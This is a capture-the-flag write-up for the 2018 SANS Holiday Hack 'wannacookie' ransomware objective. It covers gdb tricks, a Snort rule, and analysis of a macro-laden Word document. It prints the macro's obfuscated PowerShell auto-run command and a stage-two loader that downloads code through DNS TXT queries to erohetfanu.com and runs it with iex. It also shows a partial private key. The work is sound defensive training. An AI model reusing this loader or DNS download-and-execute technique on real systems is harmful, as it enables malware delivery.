## Objective 9

> Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. 
> For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.

### Challenge

> Complete this challenge by winning the sleighbell lottery for Shinny Upatree.


For this challenge you will need:

- Using GDB to call random functions: https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions


Let's tinker a little with the console:
```
elf@3f82bb99ee07:~$ ls
gdb  objdump  sleighbell-lotto

elf@3f82bb99ee07:~$ ./sleighbell-lotto 

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 5210!

Sorry - better luck next year!
elf@3f82bb99ee07:~$ 
```

We have `gbd` and `objdump`, which has a lots of options... but, as hinted in the GDB article, `nm` could be more effective:

```
elf@3f82bb99ee07:~$ nm sleighbell-lotto 
                 U EVP_sha256@@OPENSSL_1_1_0
                 U HMAC@@OPENSSL_1_1_0
0000000000207d40 d _DYNAMIC
0000000000207f40 d _GLOBAL_OFFSET_TABLE_
0000000000001630 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
000000000000702c r __FRAME_END__
0000000000006dcc r __GNU_EH_FRAME_HDR
0000000000208068 D __TMC_END__
0000000000208068 B __bss_start
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000208000 D __data_start
0000000000000ac0 t __do_global_dtors_aux
0000000000207d38 t __do_global_dtors_aux_fini_array_entry
0000000000208008 D __dso_handle
0000000000207d30 t __frame_dummy_init_array_entry
                 w __gmon_start__
0000000000207d38 t __init_array_end
0000000000207d30 t __init_array_start
0000000000001620 T __libc_csu_fini
00000000000015b0 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
                 U __stack_chk_fail@@GLIBC_2.4
0000000000208068 D _edata
0000000000208080 B _end
0000000000001624 T _fini
00000000000008c8 T _init
0000000000000a00 T _start
0000000000000c1e T base64_cleanup
0000000000000c43 T base64_decode
0000000000000bcc T build_decoding_table
0000000000208068 b completed.7696
0000000000208000 W data_start
0000000000208070 B decoded_data
0000000000208078 b decoding_table
0000000000000a30 t deregister_tm_clones
0000000000208020 d encoding_table
                 U exit@@GLIBC_2.2.5
0000000000000b00 t frame_dummy
                 U free@@GLIBC_2.2.5
                 U getenv@@GLIBC_2.2.5
0000000000000b0a T hmac_sha256
00000000000014ca T main
                 U malloc@@GLIBC_2.2.5
                 U memcpy@@GLIBC_2.14
                 U memset@@GLIBC_2.2.5
                 U printf@@GLIBC_2.2.5
                 U puts@@GLIBC_2.2.5
                 U rand@@GLIBC_2.2.5
0000000000000a70 t register_tm_clones
                 U sleep@@GLIBC_2.2.5
00000000000014b7 T sorry
                 U srand@@GLIBC_2.2.5
                 U strlen@@GLIBC_2.2.5
                 U time@@GLIBC_2.2.5
0000000000000f18 T tohex
0000000000208060 D winnermsg
0000000000000fd7 T winnerwinner
```

Well, there are some functions but the last line seems really interesting, lets jump to it with `gdb`:

```
elf@3f82bb99ee07:~$ gdb -q sleighbell-lotto 
Reading symbols from sleighbell-lotto...(no debugging symbols found)...done.

(gdb) break main
Breakpoint 1 at 0x14ce

(gdb) run
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x00005555555554ce in main ()

(gdb) jump winnerwinner
Continuing at 0x555555554fdb.

                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       

With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
[Inferior 1 (process 31) exited normally]
```



**Hint**: Chris Davis, Analyzing PowerShell Malware: https://www.youtube.com/watch?v=wd12XRq2DNk



### Objective completion

This is a multistage objective.

####Question 9 - Snort rules

> To start, assist Alabaster by accessing (clicking) the snort terminal below:
> Then create a rule that will catch all new infections. What is the success message displayed by the Snort terminal?

```
============================================================
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.

GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap

COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.
  
  Check out ~/more_info.txt for additional information.
```

Ok, first let's do some preliminary checks on the capture:

```
elf@c49c257ae0c6:~$ tcpdump -nnq -r snort.log.pcap  | wc -l
reading from file snort.log.pcap, link-type IPV4 (Raw IPv4)
390

elf@c49c257ae0c6:~$ tcpdump -nnq -r snort.log.pcap port 53 | wc -l
reading from file snort.log.pcap, link-type IPV4 (Raw IPv4)
390

elf@c49c257ae0c6:~$ tcpdump -r snort.log.pcap  | head
reading from file snort.log.pcap, link-type IPV4 (Raw IPv4)
19:42:23.094039 IP 10.126.0.125.46818 > twiga.telkom.co.ke.domain: 40558+ TXT? 77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (70)
19:42:23.104211 IP twiga.telkom.co.ke.domain > 10.126.0.125.46818: 40558*- 1/0/0 TXT "64" (137)
19:42:23.114369 IP 10.126.0.98.33580 > 150.185.71.77.domain: 14853+ TXT? 77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (67)
19:42:23.124530 IP 150.185.71.77.domain > 10.126.0.98.33580: 14853*- 1/0/0 TXT "64" (131)
19:42:23.134706 IP 10.126.0.20.11407 > yandex.ru.domain: 59582+ TXT? trilaurin.fosterhood.yandex.ru. (48)
19:42:23.144906 IP yandex.ru.domain > 10.126.0.20.11407: 59582*- 1/0/0 TXT "thiamid4" (99)
19:42:23.155119 IP 10.126.0.98.43720 > 150.185.71.77.domain: 37420+ TXT? 0.77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (69)
19:42:23.165267 IP 150.185.71.77.domain > 10.126.0.98.43720: 37420*- 1/0/0 TXT "2466756e6374696f6e73203d207b66756e6374696f6e20655f645f66696c6528246b65792c202446696c652c2024656e635f697429207b5b627974655b5d5d246b6579203d20246b65793b24537566666978203d2022602e77616e6e61636f6f6b6965223b5b53797374656d2e5265666c656374696f6e2e417373656d626c" (387)
```

The capture contains 390 dns packets (requests and responses), and at a first glance there are some standard request and some suspicious ones: 
```
19:42:23.114369 IP 10.126.0.98.33580 > 150.185.71.77.domain: 14853+ TXT? 77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (67)
19:42:23.094039 IP 10.126.0.125.46818 > twiga.telkom.co.ke.domain: 40558+ TXT? 77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (70)
```
The domain is different, but the subdomain is the same, let's filter it:
```
tcpdump -r snort.log.pcap  | grep "77616E6E61636F6F6B69652E6D696E2E707331" | head
reading from file snort.log.pcap, link-type IPV4 (Raw IPv4)
19:42:23.094039 IP 10.126.0.125.46818 > twiga.telkom.co.ke.domain: 40558+ TXT? 77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (70)
19:42:23.114369 IP 10.126.0.98.33580 > 150.185.71.77.domain: 14853+ TXT? 77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (67)
19:42:23.155119 IP 10.126.0.98.43720 > 150.185.71.77.domain: 37420+ TXT? 0.77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (69)
19:42:23.175545 IP 10.126.0.125.35545 > twiga.telkom.co.ke.domain: 13425+ TXT? 0.77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (72)
19:42:23.216468 IP 10.126.0.125.49427 > twiga.telkom.co.ke.domain: 51838+ TXT? 1.77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (72)
19:42:23.257327 IP 10.126.0.98.63089 > 150.185.71.77.domain: 1017+ TXT? 1.77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (69)
19:42:23.277667 IP 10.126.0.125.45430 > twiga.telkom.co.ke.domain: 49271+ TXT? 2.77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (72)
19:42:23.318375 IP 10.126.0.98.12856 > 150.185.71.77.domain: 18500+ TXT? 2.77616E6E61636F6F6B69652E6D696E2E707331.buegrr.org. (69)
19:42:23.359164 IP 10.126.0.125.48422 > twiga.telkom.co.ke.domain: 27507+ TXT? 3.77616E6E61636F6F6B69652E6D696E2E707331.ubeagrhnrs.ru. (72)

elf@c49c257ae0c6:~$ tcpdump -r snort.log.pcap  | grep "77616E6E61636F6F6B69652E6D696E2E707331" | wc -l
reading from file snort.log.pcap, link-type IPV4 (Raw IPv4)
130
```

Ok, definitely suspicious! What is this `77616E6E61636F6F6B69652E6D696E2E707331`? Numbers and letters only to `F`, sounds hex:

```
# echo "77616E6E61636F6F6B69652E6D696E2E707331" | xxd -r -p
wannacookie.min.ps1
```

Got it, the hex strings converts to `wannacookie.min.ps1`: we don't know yet what it is/does, but we want to block it right now.

We will need to match outgoing and incoming dns packets with the target hex string in the payload. Let's add the rules in the snort local rules file using the regex/pcre filter:

```
alert udp any any -> any 53 ( msg:"Malware Alert - dns outbound"; pcre:"/77616E6E61636F6F6B69652E6D696E2E707331/"; sid:1111; )
alert udp any 53 -> any any ( msg:"Malware Alert - dns inbound";  pcre:"/77616E6E61636F6F6B69652E6D696E2E707331/"; sid:1112; )
```
And after a few seconds:
```
elf@c49c257ae0c6:~$ vim /etc/snort/rules/local.rules 
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
```


#### Question 10 - Find the attacker's domain

> Thank you so much! Snort IDS is alerting on each new ransomware infection in our network.
> Hey, you're pretty good at this security stuff. Could you help me further with what I suspect is a malicious Word document?
>All the elves were emailed a cookie recipe right before all the infections. Take this [document](https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip) with a password of **elves** and find the domain it communicates with.

> After completing the prior question, Alabaster gives you a document he suspects downloads the malware. What is the domain name the malware in the document downloads from?


The zip archive contains a MS document file and we aren't going to open it!
Let's analyze it with `olevba` to find macros and auto-runs:

```
# olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
===============================================================================
FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Obj                                                                    ect; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Con                                                                    vert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/                                                                    1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdf                                                                    eHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zski                                                                    LPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+                                                                    JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.                                                                    Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"                                                                    " "
Shell cmd
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Obj                                                                    ect; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Con                                                                    vert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/                                                                    1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdf                                                                    eHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zski                                                                    LPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+                                                                    JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.                                                                    Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"                                                                    " "
Shell cmd
End Sub

+------------+-----------------+-----------------------------------------+
| Type       | Keyword         | Description                             |
+------------+-----------------+-----------------------------------------+
| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
|            |                 | document is opened                      |
| Suspicious | Shell           | May run an executable file or a system  |
|            |                 | command                                 |
| Suspicious | powershell      | May run PowerShell commands             |
| Suspicious | ExecutionPolicy | May run PowerShell commands             |
| Suspicious | New-Object      | May create an OLE object using          |
|            |                 | PowerShell                              |
| IOC        | powershell.exe  | Executable file name                    |
+------------+-----------------+-----------------------------------------+
```

So, we have 2 AutoExec (to match both Word and Publisher) and they try to launch the same command:

```
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Obj
ect; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Con
vert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/
1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdf
eHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zski
LPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+
JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.
Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
```

It's a powershell launched in silent mode, with Execution Policy Bypass, which executes something that's both compressed and base64 encoded.
This means that we can grab the parameter section of the `iex` call (iex stands for Invoke-Execution) and analyze what the malware is trying to launch.

Important: `sal a New-Obj` set `a` as an alias for `New-Object`: we need to look for `a` calls inside the `iex` portion and correctly rewrite them.

File `analyzed_malware_loader.ps1`:

```
$base64stuff = 'lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'

(New-Object IO.StreamReader(
    (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($base64stuff),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)
).ReadToEnd()
```

Launch it and it will return:

```
function H2A($a) {$o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; return $o}; $f = "77616E6E616
36F6F6B69652E6D696E2E707331"; $h = ""; foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT
).strings, 10)-1)) {$h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; iex($(H2A $h | Out-string))
```

Ok, we need to lint and analyze this new portion of the malware:

File `malware_stage2.ps1`:

```
function H2A($a) {
 $o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; 
 return $o
};


$f = "77616E6E61636F6F6B69652E6D696E2E707331"; 
$h = ""; 

foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; 

iex($(H2A $h | Out-string))
```

At a first glance, this second stage of the malware downloads something via dns then executes it.
We'll do the same process of "disarming" the `iex` and analyzing the script.

The `H2A` function is an hex string to ascii converter... we can test it with the `$f = "77616E6E61636F6F6B69652E6D696E2E707331"; ` variable that we've already decoded:
```
H2A "77616E6E61636F6F6B69652E6D696E2E707331"
wannacookie.min.ps1
```

Then we have a foreach portion which
- iterates from 0 to the result of a dns query
- foreach iteration it makes a sequential dns query to build up `$h`

Finally, it converts $h from hex 2 ascii and run it.

Let's analyze the foreach limit:
```
> (Resolve-DnsName -Server erohetfanu.com -Name "77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com" -Type TXT).strings
64                                                                ```          
```
The foreach will iterate from 0 to 64, like this:

```
(Resolve-DnsName -Server erohetfanu.com -Name "0.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com" -Type TXT).strings
2466756e6374696f6e73203d207b66756e6374696f6e20655f645f66696c6528246b65792c202446696c652c2024656e635f697429207b5b627974655b5d5d246b6579203d20246b65793b24
537566666978203d2022602e77616e6e61636f6f6b6965223b5b53797374656d2e5265666c656374696f6e2e417373656d626c

(Resolve-DnsName -Server erohetfanu.com -Name "1.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com" -Type TXT).strings
795d3a3a4c6f6164576974685061727469616c4e616d65282753797374656d2e53656375726974792e43727970746f67726170687927293b5b53797374656d2e496e7433325d244b65795369
7a65203d20246b65792e4c656e6774682a383b2441455350203d204e65772d4f626a656374202753797374656d2e5365637572
```

Download the malware code with `analyzed_malware_stage2.ps1`:
```
# Hex string to ASCII string
function H2A($a) {
 $o; $a -split '(..)' | ? { $_ }  | forEach {[char]([convert]::toint16($_,16))} | forEach {$o = $o + $_}; 
 return $o
};

# wannacookie.min.ps1 hex string
$f = "77616E6E61636F6F6B69652E6D696E2E707331"; 
$h = ""; 


# Malware download routine, from 0 to 64
# basing on the result of the dns query for the TXT record of 77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com
foreach ($i in 0..([convert]::ToInt32((Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfanu.com" -Type TXT).strings, 10)-1)) {
    # each query appends an hex string to $h
    $h += (Resolve-DnsName -Server erohetfanu.com -Name "$i.$f.erohetfanu.com" -Type TXT).strings}; 

# convert the hex string to ascii, then save it to file
($(H2A $h | Out-string)) | out-file wannacookie-malware.ps1
```


Before moving on to the malware itself, we now know the domain from where the malware is downloaded:

**Objective answer**: `erohetfanu.com`



#### Question 11 - The killswitch

> Erohetfanu.com, I wonder what that means?
> Unfortunately, Snort alerts show multiple domains, so blocking that one won't be effective.
> I remember another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections.
> Perhaps there is a mechanism like that in this ransomware? Do some more analysis and see if you can find a fatal flaw and activate it!

> Analyze the full malware source code to find a kill-switch and activate it at the North Pole's domain registrar [HoHoHo Daddy](https://hohohodaddy.kringlecastle.com/index.html).
> What is the full sentence text that appears on the domain registration success message (bottom sentence)?


First things firts, we need to make `wannacookie-malware.ps1` readable with indentations (I use regex mostly), then understand the main structure of the malware.

We have various function definitions, a first broad look:

- e_d_file: file encryption and decryption routine. Use a symmetric AES key
- H2B, H2A etc.: format conversion, hex2ascii, hex2bin, ascii2bin, string to char ecc
- sh1: creates a SHA1 hash
- p_k_e: encrypts something with a public key, need to dig deeper
- e_n_d: iterates throug file to encrypt them, by calling e_d_file
- g_o_dns: download stuff from dns using the same approach of the loader
- ti_rox: xor function
- snd_k: makes dns queries basing on chunks of what seems to be an encrypted key, need to dig deeper
- wanc: the main malware function

After the function definitions there's a single call to `wanc`: comment it to be able to load all the functions for further debug, without launching the malware itself.

Starting from the top of `wanc`, we find 2 if statements with a return:
```
$S1 = "1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000";
    
if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) { return };
    
if ($(netstat -ano | Select-String "127.0.0.1:8080").Length -ne 0 -or (Get-WmiObject Win32_ComputerSystem).Domain -ne "KRINGLECASTLE") { return };
``` 

Since they are on the top of the script, before the encryption starts, they could be the kill switch we're looking for!
**Important**: the second one is a protection layer from SANS to avoid that a careless hacker encrypts itself, so I'll anlyze the first one.

The first line is resolve-dns query based on the result of a dns query with nested parameters, which stops the malware if the dns query returns something.
It's quite obfuscated, but notice the domain of the query `-Name 6B696C6C737769746368.erohetfanu.com`:

```
h2a("6B696C6C737769746368")
killswitch
```

Good! Now let's find the domain name killswitch by converting the dns query pieces:
```
(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings
66667272727869657268667865666B73
```

The second bit to convert is `$(B2H $(G2B $(H2B $S1)))`:
```
B2H $(G2B $(H2B '1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000'))
1f0f0202171d020c0b09075604070a0a
```

So out target string is the result of:
```
$(H2A $(B2H $(ti_rox '1f0f0202171d020c0b09075604070a0a' '66667272727869657268667865666B73')))
yippeekiyaa.aaay
```

So the domain `yippeekiyaa.aaay` is the kill switch, register it on HoHoHo Daddy to prevent further infections!

**Objective answer**: `Successfully registered yippeekiyaa.aaay!`




#### Question 12 - Decrypt the Vault Password

> Yippee-Ki-Yay! Now, I have a ma... kill-switch!
> Now that we don't have to worry about new infections, I could sure use your L337 security skills for one last thing.
> As I mentioned, I made the mistake of analyzing the malware on my host computer and the ransomware encrypted my password database.
> Take this [zip](https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip) with a memory dump and my encrypted password database, and see if you can recover my passwords.
> One of the passwords will unlock our access to the vault so we can get in before the hackers.


> After activating the kill-switch domain in the last question, Alabaster gives you a zip file with a memory dump and encrypted password database. Use these files to decrypt Alabaster's password database. What is the password entered in the database for the Vault entry?

The zip files contains the encrypted `alabaster_passwords.elfdb.wannacookie` and the memory dump of the infected machine: the decryption key should be somewhere inside it, but we must know how it's created, its lenght etc...


So, let's dig deeper into `wanc`: we have some variable declarations first:

```
$p_k = [System.Convert]::FromBase64String($(g_o_dns ("7365727665722E637274")));
$b_k = ([System.Text.Encoding]::Unicode.GetBytes($(([char[]]([char]01..[char]255) + ([char[]]([char]01..[char]255)) + 0..9 | sort { Get-Random })[0..15] -join '')) | Where-Object { $_ -ne 0x00 });
$h_k = $(B2H $b_k);
$k_h = $(sh1 $h_k);
```

The `$p_k` var is created from a downladed dns string. 
The hex string used to call the function (`7365727665722E637274`) corresponds to `server.crt` so it's probably the attacker's public key
`$b_k` is a byte array created randomly, probably used for AES encryption
`$h_k` is the hex string that corresponds to `$b_k`
`$k_h` is the SHA1 hash of the hex string

Then we have two more variables built through function calls:

```
$p_k_e_k = (p_k_e $b_k $p_k).ToString();
$c_id = (snd_k $p_k_e_k);
``` 

The `p_k_e` function uses the attacker public key to encrypt `$b_k` and `snd_k` sends the resulting string as a dns query and returns an id.
The dns domain used by `snd_k` is `6B6579666F72626F746964` and converts to `keyforbotid`


Then the malware starts doing his nasty things:

``` 
[array]$f_c = $(Get-ChildItem *.elfdb -Exclude *.wannacookie -Path $($($env:userprofile + '\Desktop'),$($env:userprofile + '\Documents'),$($env:userprofile + '\Videos'),$($env:userprofile + '\Pictures'),$($env:userprofile + '\Music')) -Recurse | Where-Object { !$_.PSIsContainer } | ForEach-Object { $_.FullName });
    
e_n_d $b_k $f_c $true;
``` 

`$f_c` will contain the files to encrypt (*note*: there's another layer of protection from SANS, it only targets files with .elfdb extension) and `e_n_d` will encrypt all of them.

Now, the malware uses `$b_k` as AES encryption key so we just need to get its size to search the memory dump, easy?

**No**. Unfortunately after `e_n_d` the AES key is removed from memory:

```
Clear-Variable -Name "h_k";
Clear-Variable -Name "b_k";
```

After that, we have the web page portion of the malware:

```
$lurl = 'http://127.0.0.1:8080/';
$html_c = @{ 'GET /' = $(g_o_dns (A2H "source.min.html"));
    'GET /close' = '<p>Bye!</p>' };
    Start-Job -ScriptBlock { param($url);
[cut]
```
**Important**: notice that even the web page is downloaded through DNS.


**So, now what?**

We don't have the AES key, in the memory dump maybe we can find `$p_k_e_k` which is the AES key encrypted with the attacker's publick key.

But even if we are able to found it, we could not decrypt `$p_k_e_k` without the attacker private key.

Now, the malware and all of its components are available via dns by requesting the the hex that corresponds to the file name (`wannacookie.min.ps1`, `server.crt`, `source.min.html`)... maybe the key itself is hidden there?

Let's try some standard key names:

```
$(g_o_dns (A2H "private.key"))
+ ... ::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfa ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : FormatException
 

$(g_o_dns (A2H "server.pem"))
+ ... ::ToInt32($(Resolve-DnsName -Server erohetfanu.com -Name "$f.erohetfa ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : FormatException
 

$(g_o_dns (A2H "server.key"))
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDEiNzZVUbXCbMG
L4sM2UtilR4seEZli2CMoDJ73qHql+tSpwtK9y4L6znLDLWSA6uvH+lmHhhep9ui
W3vvHYCq+Ma5EljBrvwQy0e2Cr/qeNBrdMtQs9KkxMJAz0fRJYXvtWANFJF5A+Nq
jI+jdMVtL8+PVOGWp1PA8DSW7i+9eLkqPbNDxCfFhAGGlHEU+cH0CTob0SB5Hk0S
TPUKKJVc3fsD8/t60yJThCw4GKkRwG8vqcQCgAGVQeLNYJMEFv0+WHAt2WxjWTu3
HnAfMPsiEnk/y12SwHOCtaNjFR8Gt512D7idFVW4p5sT0mrrMiYJ+7x6VeMIkrw4
tk/1ZlYNAgMBAAECggEAHdIGcJOX5Bj8qPudxZ1S6uplYan+RHoZdDz6bAEj4Eyc
0DW4aO+IdRaD9mM/SaB09GWLLIt0dyhRExl+fJGlbEvDG2HFRd4fMQ0nHGAVLqaW
OTfHgb9HPuj78ImDBCEFaZHDuThdulb0sr4RLWQScLbIb58Ze5p4AtZvpFcPt1fN
6YqS/y0i5VEFROWuldMbEJN1x+xeiJp8uIs5KoL9KH1njZcEgZVQpLXzrsjKr67U
3nYMKDemGjHanYVkF1pzv/rardUnS8h6q6JGyzV91PpLE2I0LY+tGopKmuTUzVOm
Vf7sl5LMwEss1g3x8gOh215Ops9Y9zhSfJhzBktYAQKBgQDl+w+KfSb3qZREVvs9
